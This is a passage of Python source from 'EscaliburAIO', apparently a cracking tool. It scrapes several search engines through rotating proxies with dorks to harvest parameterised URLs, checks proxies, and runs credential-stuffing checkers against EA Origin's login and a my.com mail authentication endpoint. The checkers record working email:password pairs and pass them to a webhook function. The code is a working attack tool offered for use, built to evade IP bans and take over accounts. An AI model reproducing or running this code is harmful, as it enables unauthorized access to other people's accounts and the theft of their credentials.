        text = " EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))
        text2 = " [Checked] = [{}/{}]".format(checked, len(dorks))
        text4 = " [Good] = [{}]".format(Fore.GREEN + str(good) + Fore.WHITE)
        text5 = " [Bad] = [{}]".format(Fore.RED + str(bad) + Fore.WHITE)
        text6 = " [Ip Banned] = [{}]".format(Fore.CYAN + str(banned) + Fore.WHITE)
        text7 = " [Errors] = [{}]".format(Fore.LIGHTBLACK_EX + str(errors) + Fore.WHITE)
        text8 = " [CPM] = [{}]".format(Fore.BLUE + str(cpm1*60) + Fore.WHITE)
        print(text_logo)
        for char1 in text:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text2:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text4:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text5:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text6:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text7:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text8:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        threading.Thread(target=dork_screen, args=()).start()

    def screen():
        global bad, good, cpm, cpm1, errors, checked, banned, module
        os.system("cls")
        cpm1 = cpm
        cpm = 0
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | {} | Checked: {}/{} | Good: {} | Bad: {} |".format(module, checked, len(emails), good, bad))
        text_logo = "\n" + logo + "\n"
        text = " EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))
        text2 = " [Checked] = [{}/{}]".format(checked, len(emails))
        text4 = " [Good] = [{}]".format(Fore.GREEN + str(good) + Fore.WHITE)
        text5 = " [Bad] = [{}]".format(Fore.RED + str(bad) + Fore.WHITE)
        text6 = " [Ip Banned] = [{}]".format(Fore.CYAN + str(banned) + Fore.WHITE)
        text7 = " [Errors] = [{}]".format(Fore.LIGHTBLACK_EX + str(errors) + Fore.WHITE)
        text8 = " [CPM] = [{}]".format(Fore.BLUE + str(cpm1*60) + Fore.WHITE)
        print('\n' + logo + '\n' + text + '\n' + text2 + '\n' + text4 + '\n' + text5 + '\n' + text6 + '\n' + text7 + '\n' + text8)
        time.sleep(1)
        threading.Thread(target=screen, args=()).start()

    #Game

    def dork_yandex(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            import urllib.parse
            dork = str(dork1).replace(' ', '+')
            url = "https://yandex.com/search/?text={}&lr=10487".format(dork)
            headers = {
                "Host":"yandex.com",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "device-memory":"8",
                "dpr":"1",
                "viewport-width":"1920",
                "rtt":"100",
                "downlink":"8.75",
                "ect":"4g",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://yandex.com/",
                "Accept-Language":"en-US,en;q=0.9",
                "Cookie":"mda=0; yandex_gid=10488; yandexuid=8265002111595268283; yuidss=8265002111595268283; i=fmmyHmMRyjRUw+ZT9ZtrKjzx3UObaaDwhrG5TqNJKePlh667nXLRbsgdnUBUPfzMyeANwDOee38V2vTRzP/2B1w9jbs=; _ym_wasSynced=%7B%22time%22%3A1595268283528%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D; my=YwA=; ys=wprid.1595268290431250-561250269598414749000303-production-app-host-man-web-yp-71; yp=1597860283.ygu.1#1597860295.los.1#1597860295.losc.0#1595873092.szm.1%3A1920x1080%3A1920x969#1595354692.ln_tp.01",
                "Accept-Encoding":"gzip, deflate"
            }
            r = sess.get(url, headers=headers)
            if "Unfortunately, it looks like the search requests sent from your IP address are automated." in str(r.content):
                banned+=1
                threading.Thread(target=dork_yandex, args=(dork1,)).start()
            else:
                urls1 = re.findall('href="(.*?)" data-counter=', str(r.content))
                for url in urls1:
                    if url.startswith('/'):
                        pass
                    else:
                        if "=" in url:
                            good+=1
                            checked+=1
                            cpm+=1
                            open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(url))
                            open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(url))
                        else:
                            bad+=1
                            checked+=1
                            cpm+=1
                            open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(url))

        except:
            errors+=1
            threading.Thread(target=dork_yandex, args=(dork1,)).start()

    def dork_yandex_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork_yandex, args=(dorks[num],)).start()
                    num += 1

    def dork_mywebsearch(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            import urllib.parse
            dork = str(dork1).replace(' ', '+')
            dork = str(dork).replace('?', '%3F')
            dork = str(dork).replace('+', '%2B')
            dork = str(dork).replace('=', '%3D')
            url = "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?p2=%5EMYWEBSEARCHDEFAULT%5E%5E%5E&n=&ln=en&si=&tpr=hpsb&trs=wtt&brwsid=37CFBAAD-1D00-4D8B-BF07-129CE33C44B3&searchfor={}&st={}".format(dork, dork)
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer":"https://hp.mywebsearch.com/mywebsearch/index.html",
                "Accept-Encoding":"gzip, deflate"
            }
            r = sess.get(url, headers=headers)
            urls1 = re.findall('<a class="algo-title " href="(.*?)"  target=', str(r.content))
            for link in urls1:
                link = urllib.parse.unquote(link)
                if "=" in link:
                    good+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(link))
                    open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
                else:
                    bad+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))

        except:
            errors+=1
            threading.Thread(target=dork_mywebsearch, args=(dork1,)).start()

    def dork_mywebsearch_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork_mywebsearch, args=(dorks[num],)).start()
                    num += 1

    def dork_yahoo(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            import urllib.parse
            dork = str(dork1).replace(' ', '+')
            dork = str(dork).replace('?', '%3F')
            dork = str(dork).replace('+', '%2B')
            dork = str(dork).replace('=', '%3D')
            url = "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?p2=%5EMYWEBSEARCHDEFAULT%5E%5E%5E&n=&ln=en&si=&tpr=hpsb&trs=wtt&brwsid=37CFBAAD-1D00-4D8B-BF07-129CE33C44B3&searchfor={}&st={}".format(dork, dork)
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer":"https://hp.mywebsearch.com/mywebsearch/index.html",
                "Accept-Encoding":"gzip, deflate"
            }
            r = sess.get(url, headers=headers)
            urls1 = re.findall('<a class="algo-title " href="(.*?)"  target=', str(r.content))
            if r.status_code == 200:  
                for url in urls1:
                    if "=" in url:
                        good+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(url))
                        open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(url))
                    else:
                        bad+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(url))
            else:
                errors+=1
                threading.Thread(target=dork_yahoo, args=(dork1,)).start()
        except:
            errors+=1
            threading.Thread(target=dork_yahoo, args=(dork1,)).start()

    def dork_yahoo_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork_yahoo, args=(dorks[num],)).start()
                    num += 1

    def dork_aol(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            import urllib.parse
            dork = str(dork1).replace(' ', '+')
            headers = {
                "Host":"search.aol.com",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"none",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Accept-Language":"en-US,en;q=0.9",
                "Cookie":"BX=1t0sgmdfhaesu&b=3&s=dn; EuConsent=BO21FRuO21FRaAOABCENDRuAAAAuJ6__f_97_8_v2fdvduz_Ov_j_c__3XWcfPZvcELzhK9Meu_2wzd4u9wNRM5wckx87eJrEso5YzISsG-RMod_7l__3zif9oxPowEc9rz3nZEw6vs2v-ZzBCGJ_I0i; A1=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg; A3=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg; GUC=AQABAQFfFn9fN0IgxQT9; rxx=9sbqwpfv0x.201ue5ul&v=1; sBS=dpr=1&vw=1920&vh=969; x_ms=cltid=9588ed3ee1cb5d96830a56687e8bc938; aolAuthState=ptdwjcel483; A1S=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg&j=GDPR",
                "Accept-Encoding":"gzip, deflate"     
            }
            r = sess.get("https://search.aol.com/search?q={}".format(dork), headers=headers) 
            if r.status_code == 200:  
                links = re.findall('<h3 class="title"><a class=" ac-algo fz-l ac-21th lh-24" href="(.*?)" referrerpolicy=', str(r.content))
                for link in links:
                    link = urllib.parse.unquote(link)
                    link = re.search('RU=(.*?)/RK', str(link)).group(1)
                    if "=" in link:
                        good+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(link))
                        open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
                    else:
                        bad+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
            else:
                errors+=1
                threading.Thread(target=dork_aol, args=(dork1,)).start()
        except:
            errors+=1
            threading.Thread(target=dork_aol, args=(dork1,)).start()

    def dork_aol_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork_aol, args=(dorks[num],)).start()
                    num += 1

    def dork_bing(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            dork1 = str(dork1).replace(' ', '+')
            headers = {
                "Host":"www.bing.com",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.bing.com/search?q={}".format(dork),
                "Accept-Language":"en-US,en;q=0.9",
                "Cookie":"_EDGE_V=1; MUID=368260F09689603E2A116E1D97CD618B; SRCHD=AF=NOFORM; SRCHUID=V=2&GUID=66579843BA8843DA9DC26F768F920245&dmnchg=1; MUIDB=368260F09689603E2A116E1D97CD618B; _HPVN=CS=eyJQbiI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiUCJ9LCJTYyI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiSCJ9LCJReiI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiVCJ9LCJBcCI6dHJ1ZSwiTXV0ZSI6dHJ1ZSwiTGFkIjoiMjAyMC0wNy0yMFQwMDowMDowMFoiLCJJb3RkIjowLCJEZnQiOm51bGwsIk12cyI6MCwiRmx0IjowLCJJbXAiOjJ9; MSCC=1; _SS=SID=11A3FF827468607610B7F08F755A613A; SRCHUSR=DOB=20200629&T=1595234764000; ipv6=hit=1595238366326&t=4; _EDGE_S=mkt=en-en&SID=11A3FF827468607610B7F08F755A613A; SRCHHPGUSR=HV=1595234831&WTS=63730831564&CW=1920&CH=969&DPR=1&UTC=180&DM=0",
                "Accept-Encoding":"gzip, deflate"
            }
            url = "https://www.bing.com/search?q={}&qs=n&form=QBRE&sp=-1&pq={}i&sc=8-5&sk=&cvid=E995B5B4376D4A2D841846D5F4C35051".format(dork, dork)
            data = sess.get(url, headers=headers)
            if data.status_code == 200:
                links = re.findall('<li class="b_algo"><h2><a href="(.*?)" h=', str(data.content))
                for link in links:
                    if "=" in link:
                            good+=1
                            checked+=1
                            cpm+=1
                            open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(link))
                            open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
                    else:
                        bad+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
            else:
                banned+=1
                cpm+=1
                threading.Thread(target=dork_bing, args=(dork1,)).start() 
        except:
            errors+=1
            threading.Thread(target=dork_bing, args=(dork1,)).start()

    def dork_bing_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork_bing, args=(dorks[num],)).start()
                    num += 1

    def dork(dork1):
        global errors, good, bad, cpm, checked, banned
        try:
            sess = requests.Session()
            proxyl = random.choice(proxylist)
            proxy = {'http': f'http://{proxyl}', 'httsp': f'https://{proxyl}'}
            sess.proxies = proxy
            dork1 = str(dork1).replace(' ', '+')
            r = sess.get("https://google.com/search?q={}".format(dork1), headers={"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"})
            if r.status_code == 200:
                soup = BeautifulSoup(r.content, "html.parser")
                for g in soup.find_all('div', class_='r'):
                    anchors = g.find_all('a')
                    if anchors:
                        link = anchors[0]['href']
                        if "=" in link:
                            urls.append(link)
                            good+=1
                            checked+=1
                            cpm+=1
                            open("results/{}/urls.txt".format(today), "a+").write("{}\n".format(link))
                            open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
                        else:
                            bad+=1
                            checked+=1
                            cpm+=1
                            open("results/{}/urls-nonfiltred.txt".format(today), "a+").write("{}\n".format(link))
            else:
                banned+=1
                cpm+=1
                threading.Thread(target=dork, args=(dork1,)).start() 
        except:
            errors+=1
            threading.Thread(target=dork, args=(dork1,)).start()

    def dork_check():
        global dorks
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Parser"
        dork_screen()
        num = 0
        while 1: 
            if threading.active_count() < int(threads_c):
                if len(dorks) > num:
                    threading.Thread(target=dork, args=(dorks[num],)).start()
                    num += 1

    def proxy_checker(proxy):
        global errors, good, bad, cpm, checked, banned
        try:
            from proxy_checker import ProxyChecker
            checker = ProxyChecker()
            value = checker.check_proxy(proxy)
            if value is False:
                bad+=1
                checked+=1
                cpm+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}\n".format(proxy))
            else:
                good+=1
                checked+=1
                cpm+=1  
                open("results/{}/good.txt".format(today), "a+").write("{}\n".format(proxy))  
        except:
            errors+=1
            threading.Thread(target=proxy_checker, args=(proxy,)).start()

    def proxy_check():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Proxy Checker"
        proxy_screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(proxylist) > num:
                    threading.Thread(target=proxy_checker, args=(proxylist[num],)).start()
                    num += 1

    def Origin_check(email, password, proxylist):
        
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                headers123 = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }
                f = sess.get("https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834", headers=headers123)

                xd = f.headers['SelfLocation']
                content = f"email={email}&password={password}&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on"

                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(xd, data=content, headers=headers)
                if "latestSuccessLogin" in r.text:
                    good+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Your credentials are incorrect or have expired" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Origin_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Origin_check, args=(email,password, proxylist,)).start()
    def Origin():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Origin"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Origin_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def Mail_Access_check(email, password, proxylist):
        global proxy_line
        global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line
                r = sess.get("https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password), headers={"User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"})
                if "Ok=0" in r.text:
                    bad+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Ok=1" in r.text:
                    good+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=Mail_Access_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Mail_Access_check, args=(emails, passwords, proxylist,)).start()
    def Mail_Access():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
